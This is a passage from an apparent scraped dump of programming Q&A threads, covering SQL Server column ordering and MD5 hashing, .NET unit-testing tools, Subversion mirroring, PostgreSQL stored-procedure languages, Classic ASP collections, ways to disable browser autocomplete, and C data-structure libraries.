Desc\\n\\n\\nI hope this helps, I figured it out because I needed to do this myself. \\n', '\\nScript your existing table to a query window.\\nRun this script against a Test database (remove the Use statement)\\nUse SSMS to make the column changes you need\\nClick Generate Change Script (left most and bottommost icon on the\\nbuttonbar, by default)\\nUse this script against your real table\\n\\n\\nAll the script really does is create a second table table with the desired column orders, copies all your data into it, drops the original table and then renames the secondary table to take its place. This does save you writing it yourself though should you want a deploy script.\\n', 'It is not possible to change the order of the columns without recreating the whole table. If you have a few instances of the database only, you can use SSMS for this (Select the table and click \"design\").\\n\\nIn case you have too many instances for a manual process, you should try this script:\\nhttps://github.com/Epaminaidos/reorder-columns\\n'], [\"Getting back into a bit more .NET after a few-years of not using it full-time, and wondering what the good unit testing packages are these days.\\n\\nI'm familiar with NUnit (a few years ago), and have played briefly around with IronRuby, with the goal of getting something like rspec going, but don't know much beyond that.\\n\\nI realize I could google for this and call it a day but I believe I'm likely to get a better and more informed response from asking a question here :-)\\n\\nSuggestions?\\n\", 'I like MbUnit, er, Gallio.  Most importantly to me is having good tools support inside Visual Studio.  For that I use Resharper, which has an MbUnit test runner.  A lot of folks seem to like TestDriven.NET as their test runner as well.', \"I like TestDriven.NET (even though I use ReSharper) and I'm pretty happy with XUnit.net. It uses Facts instead of Tests which many people dislike but I like the difference in terminology. It's useful to think of a collection of automatically provable Facts about your software and see which ones you violate when you make a change.\\r\\nBe aware that Visual Studio 2008 Professional (and above) now comes with integrated Unit Testing (it used to be available only with the Team System Editions) and may be suitable for your needs. \", \"There are so many it's crazy.  Crazy good, I guess.\\n\\n\\nFor the conservative types (me), NUnit is still available and still more than capable.\\nFor the Microsoft-types, MSTest is adequate, but slow and clunky compared to Nunit.  It also lacks code coverage without paying the big bucks for the pricey versions of Visual Studio.\\nThere's also MbUnit.  It's like NUnit, but has nifty features like RowTest (run the same test with different parameters) and Rollback (put the database back like you found it after a test) \\nAnd finally, xUnit.net is the trendy option with some attitude.\\nOh, and TestDriven.NET will give you IDE integration for both Nunit and MBunit.\\n\\n\\nI'm sure they're all just fine.  I'd steer away from MSTest though, unless you just enjoy the convenience of having everything in one IDE out of the box.\\n\\nScott Hanselman has a podcast on this very topic.\\n\", 'xUnit.net looks like it provides a slightly different approach to N/MB/MS/Unit, which is interesting.\\n\\nIn my search for an rspec-like solution (because I LOVE the rspec), I also came across NSpec, which looks a bit wordy, but combined with the NSpec Extensions addon to use C#3 extension methods, it looks pretty nice.\\n', 'We use NUnit and MBUnit here. We use TestDriven.NET to run the unit tests from within Visual Studio. We use the excellent, highly recommended RhinoMocks as a mock framework.', \"I used to use NUnit, but I switched to MbUnit since it has more features.  I love RowTest.  It lets you parametrize your tests.  NUnit does have a litter bit better tool support though.  I am using ReSharper to run MbUnit Tests.  I've had problems with TestDriven.NET running my SetUp methods for MbUnit.\", \"This is really a personal opinion on my part (I guess that's redundant since it is a forum). NUnit, MSTest, ect all do pretty mutch the same thing.  However I find NMock indispensable.\\n\\nNMock or any mocking package is not unit testing but it makes it so much easier to do unit testing that it mught as well be.\\n\", \"Stick to NUnit.  Don't go anywhere near MSTest.\\n\\nNUnit + ReSharper is an absolute joy to work with.\\n\", \"I used to use NUnit, but now tend to use MbUnit, for two key features:\\n1. The RowTest feature allows you to easily run the same test on different sets of parameters, which is important if you really want thorough coverage.\\n2. The Rollback feature allows you to run tests against your database while rolling back changes after every test, keeping your database in exactly the same state every time. And it's as easy as adding the [Rollback] attribute.\\n\\nAnother nice aspect of MbUnit is that its syntax is nearly identical to NUnit, so if you have a whole test bed already in place under NUnit, you can just switch out the references without the need to change any (very much?) code.\\n\", 'I have made a small example of testing a .net lib using ironRuby:\\nhttp://khebbie.dk/post/2008/08/Example-of-using-ironRubys-mini_rspec-library.aspx\\n', 'I use the following:\\n\\nTestDriven.NET - Unit Testing add on for Visual Studio \\n\\nTypemock Isolator- Mocking framework for .Net Unit Testing\\n\\nNUnit - An open source unit testing framework that is in C#.\\n', 'This is an old question but you might find it interesting that Gallio v3.1 now supports RSpec via IronRuby.\\n'], ['Is it possible to create \"federated\" Subversion servers?\\r\\nAs in one server at location A and another at location B that sync up their local versions of the repository automatically.  That way when someone at either location interacts with the repository they are accessing their respective local server and therefore has faster response times.', \"Sounds like you might like Git. There's a Google Talk explaining all about it.\", 'Its probably not exactly what your looking for, but you may be able to implement OS level clustering.', 'This is more or less the perfect use case for SVK.  SVK is a command line front end for subversion that works with an entire local copy of the repository.  So your commits, updates, etc. work on the local repository and you can then sync with a master.  I would generally recommend SVK over plain subversion anyway as it makes a lot of things nicer.  No .svn folders, better branching and merging, better conflict resolution.\\n', 'Subversion 1.5 introduced write through proxy support for webdav servers over the existing SvnSync support that was added in 1.4. This allows you to have local mirrors for retrieving files and history, but commits are committed directly to the master repository. If setup correctly the local mirrors receive the changes immediately.\\n\\nSee the Svn Book for more details.\\n'], ['PostgreSQL is interesting in that it supports several languages for writing stored procedures.  Which one do you use, and why?\\n', \"When I wrote my first trigger it was in Perl because that was the language used in the example I found but the last triggers I wrote where in Python because I'm more comfortable with that.\\r\\n\\r\\nI think programmer comfort is my main reason to choose python but I think Perl is still better supported.\", \"I have only really used PL/pgSQL, but that was because I needed a few stored procedures relatively fast and didn't want to add extra modules to the server.\\n\\nLonger term, I would probably use PL/Perl or PL/Python, as I use perl for quick scripting and have been looking at python for a while now.\\n\\nOne thing I have found is that there is a lack of good documentation for that on the PostgreSQL site. The manuals were thorough as a reference, but did not work well as a tutorial to help show people how it should be done.\\n\\nThat, combined with a very good debugging environment, meant that my first experience of writing procedures involved looking at weird syntax errors for a long time.\\n\\nIf someone knows of a good site with tutorials etc for PostgreSQL programming, I would love to get a link to it.\\n\", \"Skype uses PostgreSQL together with python, and they have improved PL/Python to it's current state so I would doubt that python support is far behind perl. They have written queuing/replication system on top of those bindings, after all :-) \\n\\nTake a look: Wiki Skytools\\n\\n\\n  From a quick look in documentation, python seems to have less\\n  documentation than perl bindings, but I would suggest to just stick\\n  with language you are most comfortable with.\\n\\n\", \"I write pretty much everything in plpgsql, but I'm also a database guy first and foremost, so it generally suits me better than any other language. But there's plenty of things that it doesn't do very well, in which case another language such as plperl or plpython is a good bet. Of course, if speed is a serious concern, C is the way to go.\\n\", \"For anything really small/simple or that doesn't require a lot of string manipulation or logic, I use plpgsql, because it's fast.  For more complex things, I use plperl, because I like it.\\n\", 'PL/Ruby because I use Ruby every day anyway.\\n', \"I use PL/pgSQL for most everything, and if there is something it can't do I write functions in PL/Python (which rocks).  You can also use PL/Java, PL/Perl, PL/PHP.\\n\\nI would say Python is probably the best all around one because Python is on just about every linux system. Perl would be second with Python beating it because of the easier reading syntax.\\n\", \"I use PL/Perl because:\\n\\n\\nI like Perl\\nIt's a dynamic language, which means that you can do some useful tricks easy, i.e. passing a column name to a trigger function and doing some actions with the value of this column in a trigger tuple.\\nIt has a pretty good documentation\\n\\n\"], [\"I want to get the MD5 Hash of a string value in SQL Server 2005. I do this with the following command:\\n\\nSELECT HashBytes('MD5', 'HelloWorld')\\n\\n\\nHowever, this returns a VarBinary instead of a VarChar value. If I attempt to convert 0x68E109F0F40CA72A15E05CC22786F8E6 into a VarChar I get h *\\xa0\\\\\\x82'\\x80\\xa0 instead of 68E109F0F40CA72A15E05CC22786F8E6.\\n\\nIs there any SQL-based solution?\\n\\nYes\\n\", \"I have found the solution else where:\\r\\n\\r\\nSELECT SUBSTRING(master.dbo.fn_varbintohexstr(HashBytes('MD5', 'HelloWorld')), 3, 32) \", 'Changing the datatype to varbinary seems to work the best for me.\\n', \"SELECT CONVERT(NVARCHAR(32),HashBytes('MD5', 'Hello World'),2)\\n\\n\\n\\n\", \"Use master.dbo.fn_varbintohexsubstring(0, HashBytes('SHA1', @input), 1, 0) instead of master.dbo.fn_varbintohexstr and then substringing the result.\\n\\nIn fact fn_varbintohexstr calls fn_varbintohexsubstring internally. The first argument of fn_varbintohexsubstring tells it to add 0xF as the prefix or not. fn_varbintohexstr calls fn_varbintohexsubstring with 1 as the first argument internaly.\\n\\nBecause you don't need 0xF, call fn_varbintohexsubstring directly.\\n\", \"convert(varchar(34), HASHBYTES('MD5','Hello World'),1)\\n\\n\\n(1 for converting hexadecimal to string)\\n\\nconvert this to lower and remove 0x from the start of the string by substring:\\n\\nsubstring(lower(convert(varchar(34), HASHBYTES('MD5','Hello World'),1)),3,32)\\n\\n\\nexactly the same as what we get in C# after converting bytes to string\\n\", \"Contrary to what David Knight says, these two alternatives return the same response in MS SQL 2008:\\n\\nSELECT CONVERT(VARCHAR(32),HashBytes('MD5', 'Hello World'),2)\\nSELECT UPPER(master.dbo.fn_varbintohexsubstring(0, HashBytes('MD5', 'Hello World'), 1, 0))\\n\\n\\nSo it looks like the first one is a better choice, starting from version 2008.\\n\", \"With personal experience of using the following code within a Stored Procedure which Hashed a SP Variable I can confirm, although undocumented, this combination works 100% as per my example:\\n\\n@var=SUBSTRING(master.dbo.fn_varbintohexstr(HashBytes('SHA2_512', @SPvar)), 3, 128)\\n\\n\"], ['I currently use a DataTable to get results from a database which I can use in my code.\\n\\nHowever, many example on the web show using a DataSet instead and accessing the table(s) through the collections method.\\n\\nIs there any advantage, performance wise or otherwise, of using DataSets or DataTables as a storage method for SQL results?\\n', \"in 1.x there used to be things DataTables couldn't do which DataSets could (don't remember exactly what). All that was changed in 2.x.  My guess is that's why a lot of examples still use DataSets.  DataTables should be quicker as they are more lightweight. If you're only pulling a single resultset, its your best choice between the two.\", 'It really depends on the sort of data you\\'re bringing back.  Since a DataSet is (in effect) just a collection of DataTable objects, you can return multiple distinct sets of data into a single, and therefore more manageable, object.  \\n\\nPerformance-wise, you\\'re more likely to get inefficiency from unoptimized queries than from the \"wrong\" choice of .NET construct.  At least, that\\'s been my experience.\\n', 'One feature of the DataSet is that if you can call multiple select statements in your stored procedures, the DataSet will have one DataTable for each.', 'There are some optimizations you can use when filling a DataTable, such as calling BeginLoadData(), inserting the data, then calling EndLoadData().  This turns off some internal behavior within the DataTable, such as index maintenance, etc.  See this article for further details.\\n', 'On major difference is that DataSets can hold multiple tables and you can define relationships between those tables. \\n\\nIf you are only retuning a single result set though I would think a DataTable would be more optimized. I would think there has to be some overhead (granted small) to offer the functionality a DataSet does and keep track of multiple DataTables. \\n'], ['I want to be able to do:For Each thing In things\\r\\nEnd For\\r\\n\\r\\nCLASSIC ASP - NOT .NET!', \"Whatever your [things] are need to be written outside of VBScript.\\r\\n\\r\\nIn VB6, you can write a Custom Collection class, then you'll need to compile to an ActiveX DLL and register it on your webserver to access it.\", 'Something like this?\\n\\ndim cars(2),x\\ncars(0)=\"Volvo\"\\ncars(1)=\"Saab\"\\ncars(2)=\"BMW\"\\n\\nFor Each x in cars\\n  response.write(x &amp; \"&lt;br /&gt;\")\\nNext\\n\\n\\nSee www.w3schools.com.\\n\\nIf you want to associate keys and values use a dictionary object instead:\\n\\nDim objDictionary\\nSet objDictionary = CreateObject(\"Scripting.Dictionary\")\\nobjDictionary.Add \"Name\", \"Scott\"\\nobjDictionary.Add \"Age\", \"20\"\\nif objDictionary.Exists(\"Name\") then\\n    \\' Do something\\nelse\\n    \\' Do something else \\nend if\\n\\n', 'The closest you are going to get is using a Dictionary (as mentioned by Pacifika)\\n\\nDim objDictionary\\nSet objDictionary = CreateObject(\"Scripting.Dictionary\")\\nobjDictionary.CompareMode = vbTextCompare \\'makes the keys case insensitive\\'\\nobjDictionary.Add \"Name\", \"Scott\"\\nobjDictionary.Add \"Age\", \"20\"\\n\\n\\nBut I loop through my dictionaries like a collection\\n\\nFor Each Entry In objDictionary\\n  Response.write objDictionary(Entry) &amp; \"&lt;br /&gt;\"\\nNext\\n\\n\\nYou can loop through the entire dictionary this way writing out the values which would look like this:\\n\\nScott\\n20\\n\\n\\nYou can also do this\\n\\nFor Each Entry In objDictionary\\n  Response.write Entry &amp; \": \" &amp; objDictionary(Entry) &amp; \"&lt;br /&gt;\"\\nNext\\n\\n\\nWhich would produce\\n\\n Name: Scott\\n Age: 20\\n\\n', 'As Brett said, its better to use a vb component to create collections. Dictionary objects are not very commonly used in ASP unless for specific need based applications. \\n', \"One approach I've used before is to use a property of the collection that returns an array, which can be iterated over.\\n\\nClass MyCollection\\n    Public Property Get Items\\n        Items = ReturnItemsAsAnArray()\\n    End Property\\n    ...\\nEnd Class\\n\\n\\nIterate like:\\n\\nSet things = New MyCollection\\nFor Each thing in things.Items\\n    ...\\nNext\\n\\n\", 'Be VERY carefully on using VB Script Dictionary Object!\\nJust discover this \"autovivication\" thing, native on this object: http://en.wikipedia.org/wiki/Autovivification\\n\\nSo, when you need to compare values, NEVER use a boolen comparison like:\\nIf objDic.Item(\"varName\") &lt;&gt; \"\" Then...\\nThis will automatically add the key \"varName\" to the dictionary (if it doesn\\'t exist, with an empty value) , in order to carry on evaluating the boolean expression.\\n\\nIf needed, use instead If objDic.Exists(\"varName\").  \\n\\nJust spend a few days knocking walls, with this Mcrosoft \"feature\"...\\nvbscript-dictionary-object-creating-a-key-which-never-existed-but-present-in-another-object\\n'], ['How do you disable autocomplete in the major browsers for a specific input (or form field)?\\n', 'Firefox 30 ignores autocomplete=\"off\" for passwords, opting to prompt the user instead whether the password should be stored on the client. Note the following commentary from May 5, 2014:\\n\\n\\n  \\n  The password manager always prompts if it wants to save a password. Passwords are not saved without permission from the user.\\n  We are the third browser to implement this change, after IE and Chrome.\\n  \\n\\n\\nAccording to Mozilla developer documentation the form element attribute autocomplete prevents form data from being cached in older browsers.\\n\\n&lt;input type=\"text\" name=\"foo\" autocomplete=\"off\" /&gt;\\n\\n', '&lt;form autocomplete=\"off\" ...\\r\\n\\r\\nwas a none standard way to do this (I think mozilla and IE still support it) but messing with the users expectations is normally a bad idea.  \\r\\n\\r\\nIf the user enters their credit card details into a form and then let\\'s someone else use that browser it\\'s not your concern :)', 'Use a non-standard name and id for the fields, so rather than \"name\" have \"name_\". Browsers will then not see it as being the name field. The best part about it is that you can do this to some but not all fields and it will autocomplete some but not all fields.', '&lt;form name=\"form1\" id=\"form1\" method=\"post\" \\n      autocomplete=\"off\" action=\"http://www.example.com/form.cgi\"&gt;\\n\\n\\nThis will work in IE and FF, the downside is that it is not XHTML standard.\\n', 'Just set autocomplete=\"off\". There is a very good reason for doing this: You want to provide your own autocomplete functionality!\\n', 'On a related, or actually, on the completely opposite note - if you\\'re the user of the aforementioned form and want to re-enable the autocomplete functionality, use the \\'remember password\\' bookmarklet from this bookmarklets page. It removes all \\'autocomplete=\"off\"\\' attributes from all forms on the page. Keep fighting the good fight!\\n', 'Why would you make your user\\'s life less convenient?\\n\\n\"Passwords / credit card data / etc. should not be saved\" is a bad argument: with autocomplete on, browsers in Mac OS X store such values in an encrypted database with per-application permissions. Conversely, what\\'s the realistic effect of autocomplete=off? The user is going to write it in an unencrypted text file, or better yet, on a post-it note attached to the screen.\\n\\nGood thing there\\'s bookmarklets like the one Antti mentioned, and patches to make the engine ignore the attribute altogether.\\n\\nSeriously, I urge you to reconsider using this attribute. It does not benefit anyone.\\n', \"We did actually use sasb's idea for one site. It was a medical software web app to run a doctor's office. However, many of our clients were surgeons who used lots of different workstations, including semi-public terminals. So, they wanted to make sure that a doctor who doesn't understand the implication of auto-saved passwords or isn't paying attention can't accidentally leave their login info easily accessible. Of course, this was before the idea of private browsing that is starting to be featured in IE8, FF3.1, etc. Even so, many physicians are forced to use old school browsers in hospitals with IT that won't change.\\n\\nSo, we had the login page generate random field names that would only work for that post. Yes, it's less convenient, but it's just hitting the user over the head about not storing login information on public terminals.\\n\", \"In addition to autocomplete=off, you could also have your form fields names be randomized by the code that generates the page, perhaps by adding some session-specific string to the end of the names.  When the form is submitted, you can strip that part off before processing them on the server side. This would prevent the web browser from finding context for your field and also might help prevent XSRF attacks because an attacker wouldn't be able to guess the field names for a form submission.\\n\", 'As others have said, the answer is autocomplete=\"off\"\\n\\nHowever I think it\\'s worth stating why it\\'s a good idea to use this in certain cases as some answers to this and duplicate questions have suggested it\\'s better not to turn if off.\\n\\nStopping browsers storing credit card numbers shouldn\\'t be left to users. Too many users won\\'t even realise it\\'s a problem.\\n\\nIt\\'s particularly important to turn it off on fields for credit card security codes. As this page states\\n\\n\\n  \"Never store the security code ... its value depends on the presumption that the only way to supply it is to read it from the physical credit card, proving that the person supplying it actually holds the card.\"\\n\\n\\nThe problem is, if it\\'s a public computer (cyber cafe, library etc) it\\'s then easy for other users to steal your card details, and even on your own machine a malicious website could steal autocomplete data.\\n', 'In order to avoid the invalid XHTML you can set this attribute using javascript. Example using jQuery:\\n\\n&lt;input type=\"text\" class=\"noAutoComplete\" ... /&gt;\\n\\n$(function() {\\n    $(\\'.noAutoComplete\\').attr(\\'autocomplete\\', \\'off\\');\\n});\\n\\n\\nThe problem is that users without javascript will do get the autocomplete functionality.\\n', 'Adding the \\n\\nautocomplete=\"off\" \\n\\nto the form tag will disable the browser autocomplete (what was previously typed into that field) from all input fields within that particular form.\\n\\nTested on:\\n\\n\\nFirefox 3.5, 4 BETA \\nInternet Explorer 8 \\nChrome\\n\\n', \"I think autocomplete=off is supported in HTML 5.\\n\\nAsk yourself why you want to do this though - it may make sense in some situations but don't do it just for the sake of doing it.\\n\\nIt's less convenient for users and not even a security issue in OS X (mentioned by Soren below). If you're worried about people having their passwords stolen remotely - a keystroke logger could still do it even though your app uses autcomplete=off.\\n\\nAs a user who chooses to have a browser remember (most of) my information, I'd find it annoying if your site didn't remember mine.\\n\", \"I'd have to beg to differ with those answers that say to avoid disabling auto-complete.\\n\\nThe first thing to bring up is that auto-complete not being explicitly disabled on login form fields is a PCI-DSS fail. In addition, if a users' local machine is compromised then any autocomplete data can be trivially obtained by an attacker due to it being stored in the clear.\\n\\nThere is certainly an argument for usability, however there's a very fine balance when it comes to which form fields should have autocomplete disabled and which should not.\\n\", 'You may use in input.\\n\\nFor example;\\n\\n&lt;input type=text name=\"test\" autocomplete=\"off\" /&gt;\\n\\n', 'try these too if just autocomplete=\"off\" doesn\\'t work:\\n\\nautocorrect=\"off\" autocapitalize=\"off\" autocomplete=\"off\"\\n\\n', \"Three options:\\nFirst: \\n\\n&lt;input type='text' autocomplete='off' /&gt;\\n\\n\\nSecond: \\n\\n&lt;form action='' autocomplete='off'&gt;\\n\\n\\nThird (javascript code): \\n\\n$('input').attr('autocomplete', 'off');\\n\\n\", 'None of the solutions worked for me in this conversation. \\n\\nI finally figured out a pure HTML solution that requires no Javascript, works in modern browsers (except IE; there had to at least 1 catch, right?), and does not require you to disable autocomplete for the entire form.\\n\\nSimply turn off autocomplete on the form and then turn it ON for any input you wish it to work within the form. For example:\\n\\n&lt;form autocomplete=\"off\"&gt;\\n    &lt;!-- these inputs will not allow autocomplete and chrome \\n         won\\'t highlight them yellow! --&gt;\\n    &lt;input name=\"username\"  /&gt;\\n    &lt;input name=\"password\" type=\"password\" /&gt;\\n    &lt;!-- this field will allow autocomplete to work even \\n         though we\\'ve disabled it on the form --&gt;\\n    &lt;input name=\"another_field\" autocomplete=\"on\" /&gt;\\n&lt;/form&gt;\\n\\n', 'Most of the major browsers and password managers (correctly, IMHO) now ignore autocomplete=off. \\n\\nWhy? Many banks and other \"high security\" websites added autocomplete=off to their login pages \"for security purposes\" but this actually decreases security since it causes people to change the passwords on these high security sites to be easy to remember (and thus crack) since autocomplete was broken. \\n\\nLong ago most password managers started ignoring autocomplete=off, and now the browsers are starting to do the same for username/password inputs only.\\n\\nUnfortunately bugs in the autocomplete implementations insert username and/or password info  into inappropriate form fields, causing form validation errors, or worse yet, accidentally inserting usernames into fields that were intentionally left blank by the user.\\n\\nWhat\\'s a web developer to do?\\n\\n\\nIf you can keep all password fields on a page by themselves, that\\'s a great start as it seems that the presence of a password field is the main trigger for user/pass autocomplete to kick in. Otherwise, read the tips below.\\nSafari notices that there are 2 password fields and disables autocomplete in this case, assuming it must be a change password form, not a login form. So just be sure to use 2 password fields (new and confirm new) for any forms where you allow \\nChrome 34 unfortunately will try to autofill fields with user/pass whenever it sees a password field. This is quite a bad bug that hopefully they will change to the Safari behavior. However, adding this to the top of your form seems to disable the password autofilling:\\n\\n&lt;input type=\"text\" style=\"display:none\"&gt;\\n&lt;input type=\"password\" style=\"display:none\"&gt;\\n\\n\\n\\nI haven\\'t yet investigated IE or Firefox thoroughly but will be happy to update the answer if others have info in the comments.\\n', 'Sometimes even autocomplete=off would not prevent to fill in credentials into wrong fields, but not user or nickname field. \\n\\nThis workaround is in addition to apinstein\\'s post about browser behavior.\\n\\nfix browser autofill in: readonly and set writeble on focus (click and tab)\\n\\n &lt;input type=\"password\" readonly  \\n     onfocus=\"this.removeAttribute(\\'readonly\\');\"/&gt;\\n\\n\\nBecause, Browser auto fills credentials to wrong text field!?\\n\\nI notice this strange behavior on Chrome and Safari, when there are password fields in the same form. I guess, the browser looks for a password field to insert your saved credentials. Then it autofills (just guessing due to observation) the nearest textlike-input field, that appears prior the password field in DOM. As the browser is the last instance and you can not control it, \\n\\nThis readonly-fix above worked for me.\\n', 'I\\'ve been trying endless solutions, and then I found this:\\n\\nInstead of autocomplete=\"off\" just simply use autocomplete=\"false\"\\n\\nAs simple as that, and it works like a charm in Google Chrome as well!\\n', 'This is a security issue that browsers ignores now. Browsers identifies and stores content using input names, even if developpers consider the information is sensitive and should not be stored. Making an input name different between 2 requests will solve the problem (but will still be saved in browser\\'s cache and will also increase browser\\'s cache). Ask the user to activate or deactivate options in its browser\\'s settings is not a good solution. The issue can be fixed in the backend.\\n\\nHere\\'s my fix. An approach that I have implemented in my framework. All  autocomplete elements are generated with an hidden input like this :\\n\\n&lt;? $r = rmd5(rand().mocrotime(TRUE)); ?&gt;\\n&lt;form method=\"POST\" action=\"./\"&gt;\\n    &lt;input type=\"text\" name=\"&lt;? echo $r; ?&gt;\" /&gt;\\n    &lt;input type=\"hidden\" name=\"__autocomplete_fix_&lt;? echo $r; ?&gt;\" value=\"username\" /&gt;\\n    &lt;input type=\"submit\" name=\"submit\" value=\"submit\" /&gt;\\n&lt;/form&gt;\\n\\n\\nServer then process post variables like this :\\n\\nforeach ($_POST as $key =&gt; $val)\\n{\\n    if(preg_match(\\'#^__autocomplete_fix_#\\', $key) === 1){\\n        $n = substr($key, 19);\\n        if(isset($_POST[$n]))$_POST[$val] = $_POST[$n];\\n    }\\n}\\n\\n\\nThe value can be accessed as usual\\n\\nvar_dump($_POST[\\'username\\']);\\n\\n\\nAnd the browser won\\'t be able to suggest information from previous request or from previous users.\\n\\nAll works like a charm, even if browsers updates, wants to ignore autocomplete or not. That has been the best way to fix the issue for me.\\n', 'None of the hacks mentioned here worked for me in Chrome.\\nThere\\'s a discussion of the issue here: https://code.google.com/p/chromium/issues/detail?id=468153#c41\\n\\nAdding this inside a &lt;form&gt; works (at least for now):\\n\\n&lt;div style=\"display: none;\"&gt;\\n    &lt;input type=\"text\" id=\"PreventChromeAutocomplete\" name=\"PreventChromeAutocomplete\" autocomplete=\"address-level4\" /&gt;\\n&lt;/div&gt;\\n\\n', 'I know this is an old post, but it could be important to know that Firefox (I think only firefox) uses a value called ismxfilled that basically forces autocomplete.\\n\\nismxfilled=\"0\" for OFF \\n\\nor \\n\\nismxfilled=\"1\" for ON\\n', 'Adding autocomplete=\"off\" is not gonna cut it.\\n\\nChange input type attribute to type=\"search\".\\nGoogle doesn\\'t apply auto-fill to inputs with a type of search.\\n', 'Safari does not change its mind about autocomplete if you set autocomplete=\"off\" dynamically from javascript. However it would respect if you do that on per-field basis.\\n\\n$(\\':input\\', $formElement).attr(\\'autocomplete\\', \\'off\\');\\n\\n', '&lt;script language=\"javascript\" type=\"text/javascript\"&gt;\\n    $(document).ready(function () {\\n        try {\\n            $(\"input[type=\\'text\\']\").each(function(){\\n                           $(this).attr(\"autocomplete\",\"off\");\\n                        });\\n        }\\n        catch (e)\\n        { }\\n    });\\n\\n&lt;/script&gt;\\n\\n', 'Chrome is planning to support this. \\n\\nFor now the best suggestion is to use an input type that is rarely autocompleted. \\n\\nchrome discussion\\n\\n&lt;input type=\\'search\\' name=\"whatever\" /&gt;\\n\\n\\nto be compatible with firefox, use normal autocomplete=\\'off\\'\\n\\n&lt;input type=\\'search\\' name=\"whatever\" autocomplete=\\'off\\' /&gt;\\n\\n', 'You can disable autocomplete if you remove the form tag, the same was done by my bank and I was wondering how they did this. It even remove the value that was already remembered by the browser after you remove the tag.\\n', 'This is what we called autocomplete of a textbox.\\n\\nWe can disable autocomplete of a Textbox in 2 ways-\\n\\n\\nBy Browser Label\\nBy Code\\n\\nTo disable in browser go to the setting\\n\\n\\n\\n\\n\\n\\nGo to advance setting and uncheck the checkbox and then Restore. \\n\\nIf you want to disable in coding label you can do as follow-\\nUsing AutoCompleteType=\"Disabled\":\\n\\n&lt;asp:TextBox runat=\"server\" ID=\"txt_userid\" AutoCompleteType=\"Disabled\"&gt;&lt;/asp:TextBox&gt;  \\n\\n\\nBy Setting Form autocomplete=\"off\":\\n\\n&lt;asp:TextBox runat=\"server\" ID=\"txt_userid\" autocomplete=\"off\"&gt;&lt;/asp:TextBox&gt; \\n\\n\\nBy Setting Form autocomplete=\"off\":\\n\\n&lt;form id=\"form1\" runat=\"server\" autocomplete=\"off\"&gt;  \\n    //your content\\n&lt;/form&gt;  \\n\\n\\nBy using code in .cs page\\n\\nprotected void Page_Load(object sender, EventArgs e)  \\n    {  \\n    if(!Page.IsPostBack)  \\n    {  \\n\\n\\n        txt_userid.Attributes.Add(\"autocomplete\", \"off\");  \\n\\n    }  \\n}  \\n\\n\\nBy Using Jquery\\n\\nhead runat=\"server\"&gt;  \\n&lt;title&gt;&lt;/title&gt;  \\n&lt;script src=\"Scripts/jquery-1.6.4.min.js\"&gt;&lt;/script&gt;  \\n&lt;script type=\"text/javascript\"&gt;  \\n    $(document).ready(function () {  \\n        $(\\'#txt_userid\\').attr(\\'autocomplete\\', \\'off\\');  \\n\\n    });  \\n\\n&lt;/script&gt;  \\n\\n', 'A little late to the game...but I just ran into this problem and tried several failures, but this one works for me found on MDN\\n\\n\\n  In some case, the browser will keep suggesting autocompletion values\\n  even if the autocomplete attribute is set to off. This unexpected\\n  behavior can be quite puzzling for developers. The trick to really\\n  force the no-completion is to assign a random string to the attribute\\n  like so :\\n\\n\\nautocomplete=\"nope\"\\n\\n', 'I can\\'t believe this is still an issue so long after it\\'s been reported. The above solutions didn\\'t work for me, as safari seemed to know when the element was not displayed or off-screen, however the following did work for me:\\n\\n&lt;div style=\"height:0px; overflow:hidden; \"&gt;\\n  Username &lt;input type=\"text\" name=\"fake_safari_username\" &gt;\\n  Password &lt;input type=\"password\" name=\"fake_safari_password\"&gt;\\n&lt;/div&gt;\\n\\n\\nHope that\\'s useful for somebody!\\n', 'If your issue is having a password field being auto-completed, then you may find this useful...\\n\\nWe had this issue in several areas of our site where the business wanted to re-query the user for their username and password and specifically did not want the password autofill to work for contractual reasons.  We found that the easiest way to do this is to put in a fake password field for the browser to find and fill while the real password field remains untouched.\\n\\n&lt;!-- This is a fake password input to defeat the browser\\'s autofill behavior --&gt;\\n&lt;input type=\"password\" id=\"txtPassword\" style=\"display:none;\" /&gt;\\n&lt;!-- This is the real password input --&gt;\\n&lt;input type=\"password\" id=\"txtThisIsTheRealPassword\" /&gt;\\n\\n\\nNote that in Firefox and IE, it was simply enough to put any input of type password before the actual one but Chrome saw through that and forced me to actually name the fake password input (by giving it an obvious password id) to get it to \"bite\".  I used a class to implement the style instead of using an embedded style so try that if the above doesn\\'t work for some reason.\\n', 'You can simply put the autocomplete=\"off\" in the HTML fields like following code.\\n\\n&lt;input type=\"text\" name=\"\" value=\"\" autocomplete=\"off\" /&gt;\\n\\n', 'So here is it (:\\n\\n&lt;input oninput=\"turnOnPasswordStyle()\" id=\"inputpassword\" type=\"text\"&gt;\\n\\nfunction turnOnPasswordStyle(){\\n        $(\\'#inputpassword\\').attr(\\'type\\', \"password\");\\n}\\n\\n', 'The answer dsuess posted with the readonly was very clever and worked. But as I am using boostrap, the readonly input field was - until focused - marked with grey background. While the document loads, you can trick the browser by simply locking and unlocking the input.\\n\\nSo I had an idea to implement this into jQuery solution:\\n\\n\\n    jQuery(document).ready(function () {\\n        $(\"input\").attr(\\'readonly\\', true);\\n        $(\"input\").removeAttr(\\'readonly\\');\\n   });\\n\\n\\n', \"My problem was mostly autofill with Chrome, but I think this is probably more problematic than autocomplete.\\n\\nTrick : using a timer to reset form and set password fields to blank. The 100ms duration seems to be minimal for it to work.\\n\\n$(document).ready(function() {\\n    setTimeout(function() {\\n        var $form = $('#formId');\\n        $form[0].reset();\\n        $form.find('INPUT[type=password]').val('');\\n    }, 100);\\n});\\n\\n\", \"I use the following jQuery snippet:\\n\\n// Prevent input autocomplete\\n$.fn.preventAutocomplete = function() {\\n    this.each(function () {\\n        var $el = $(this);\\n        $el\\n            .clone(false, false)\\n            .insertBefore($el)\\n            .prop('id', '')\\n            .hide()\\n        ;\\n    });\\n};\\n\\n\\nAnd than just $('#login-form input').preventAutocomplete();\\n\"], ['What are good libraries for C with datastructures like vectors, deques, stacks, hashmaps, treemaps, sets, etc.? Plain C, please, and platform-independent.', 'As always, Google is your friend:\\r\\nhttp://nixbit.com/cat/programming/libraries/c-generic-library/\\r\\nspecifically:\\r\\nhttp://nixbit.com/cat/programming/libraries/generic-data-structures-library/', 'The Glib library used on the Gnome project may also be some use. Moreover it is pretty well tested.\\n\\nIBM developer works has a good tutorial on its use: Manage C data using the GLib collections\\n', \"There's some stuff in the Apache Portable Runtime (APR) that I'd expect to be very solid.\\n\", 'Maybe http://sglib.sourceforge.net/ if you want an easy to use, very fast, macro based library.\\n', 'If hash tables, extensible strings and dynamic vector are enough for your needs, please have a look at the library I put toghether: http://code.google.com/p/c-libutl/.\\n\\nI also would welcome any feedback!\\n'], 